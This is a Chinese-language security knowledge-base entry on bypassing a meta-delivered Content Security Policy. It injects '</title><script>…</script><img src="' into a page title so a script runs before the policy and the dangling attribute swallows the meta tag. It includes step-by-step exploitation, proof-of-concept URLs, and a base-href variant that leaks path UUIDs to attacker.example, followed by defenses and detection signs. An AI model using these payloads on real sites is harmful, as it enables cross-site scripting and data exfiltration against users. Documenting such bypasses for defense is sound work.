---
id: web-generic-xss-meta-csp-dangling-markup-bypass
title: meta CSP 悬空标记绕过：title 提前闭合 + 未闭合 img 属性吞掉 CSP meta
type: scenario
domain: web
path: web/generic/xss
technique: meta-csp-dangling-markup-bypass
tags:
- web
- xss
- csp
- csp-bypass
- dangling-markup
- html-parser
- title
- base
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:44+08:00'
  notes: 已对照原文与 img/12-15 核对 /profile 无响应头 CSP、meta CSP 位于 title 之后、name=</title><script>alert(origin)</script><img src=" 提前闭合 title 并吞掉 meta，以及 base href+preload scanner 外带 UUID 变体。未验证点：base 外带未展示攻击者接收回执；未复跑。
url: /docs/web/generic/xss/web-generic-xss-meta-csp-dangling-markup-bypass/
draft: false
kb_aliases:
- meta CSP 失效
- dangling markup CSP bypass
- title 提前闭合
- img src 悬空属性
- SatoNote CSP 绕过
- base href 预加载外带
---

## 一句话结论

当页面把用户输入反射进 `<title>`，且 CSP 通过紧随其后的 `<meta http-equiv="Content-Security-Policy">` 下发时，注入 `</title><script>...</script><img src="` 可提前闭合 title 并在 CSP meta 之前执行脚本；未闭合的 `src="` 还会把 CSP meta 吞进 img 的属性值，使 meta CSP 完全失效，从而在声明 `script-src 'none'` 的页面上执行 XSS。

## 原理

- `<title>` 是 RCDATA，只有 `</title>` 能结束；若 `name` 等参数未做 HTML 转义，攻击者可以直接闭合 title。
- 脚本被插入在 title 之后、meta CSP 之前。meta CSP 只有在被解析成 `meta` 元素时才生效；在它之前已经执行的脚本不受约束。
- 更彻底的是 `<img src="`：未闭合的双引号属性值会一直吞到文档中下一个 `"`，通常正好是 meta 标签里的引号；于是整个 `<meta http-equiv="Content-Security-Policy" ...>` 被当成 img 标签的属性文本，浏览器不会创建 meta 元素，CSP 完全不生效。原文截图中 DevTools 显示 CSP meta 被包进 img 属性值。
- 该应用在 `/profile` 路由不设置 CSP 响应头（中间件跳过 `/profile`），只依赖页面里的 meta；因此吞掉 meta 后就没有任何 CSP 层。
- 结果：`<script>alert(origin)</script>` 正常执行。同样的 head 注入还可插入 `<base href=...>`，改变后续相对 URL 的解析基址。

## 触发条件

- 用户输入未经 HTML 转义地进入 `<title>`（或 head 中其它 RCDATA 元素），且位于 CSP meta 之前；
- CSP 通过 meta 而非响应头下发，或目标路由没有响应头 CSP；
- 存在可注入的 `<script>`/事件处理器上下文，且没有其他 CSP 层；
- 若要读取同源数据，XSS 需在同源页面执行。

## 利用步骤

1. 确认 `name` 等参数进入 `<title>` 且未转义；确认 CSP 是 meta 而不是 response header。
2. 提交 `?name=</title><script>alert(origin)</script><img src="`。
3. 页面解析顺序：title 闭合 → script 执行 → img 的 src 属性吞掉后面的 meta/link。
4. 在 DevTools 中确认 `document.querySelector('meta[http-equiv]')` 为 null，且脚本已执行。
5. 变体：`?name=</title><base href=http://attacker/><img src=%22` 让后续 `/images/<uuid>.png` 等相对资源按攻击者 base 解析，浏览器预加载扫描器提前向攻击者发起请求，把路径中的 UUID 泄露出去。

## PoC

```text
http://target/profile/<uuid>?name=</title><script>alert(origin)</script><img src="
```

```text
# base/预加载外带变体（URL 编码后）
?name=</title><base href=http://attacker.example/><img src=%22
```

```html
<!-- 浏览器实际解析出的片段：script 在 meta 之前，随后 img 的 src=" 把 meta 吞进属性值 -->
<title>Welcome name=</title><script>alert(origin)</script><img src=" - Note Atelier</title>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; ...">
```

## 变体与关联

- 若 title 被转义，找其他在 CSP meta 之前的 head 注入点（meta/link/base 属性、head 注释、RCDATA 元素）。
- 若 CSP 同时有响应头，meta 失效无影响；此时需要找响应头 CSP 的其它绕过。
- base 预加载外带：注入 `<base>` 后，浏览器预加载扫描器会把后续相对 URL（如 `/images/<uuid>.png`）解析到攻击者域；这是 HTML 注入下无需 JS 的数据外带原语，依赖页面存在相对子资源且 `base-uri` 未被 CSP 限制。
- 关联：[[web-generic-auth-host-header-dangling-markup-password]]（悬空标记窃取数据）、[[web-generic-xss-csp-self-jsonp-callback-bypass]]（其它 CSP 绕过）、[[web-generic-xss-scriptless-execution-vectors]]（无 script 标签的替代载体）。
- 边界：meta CSP 位于注入点之前、name 被 HTML 编码、CSP 由响应头下发、`base-uri 'none'` 阻止 base 时失效。

## 检测与防御

- 对进入 title/head 的所有用户输入做 HTML 转义；不要把用户输入拼进 `<title>` 或 head 其它标记。
- CSP 用响应头下发，并设置 `base-uri 'none'`；同时保留 meta 作为纵深防御时也要注意解析顺序。
- 对 head 注入做输出编码与白名单；限制 `<base>` 标签的使用。
- 检测：响应中出现 `</title>`、未闭合的 `<img src="`、`<base`、注入的 `<script>`；CSP 违规报告缺失或 meta 元素数量异常；攻击者域收到页面相对资源路径。
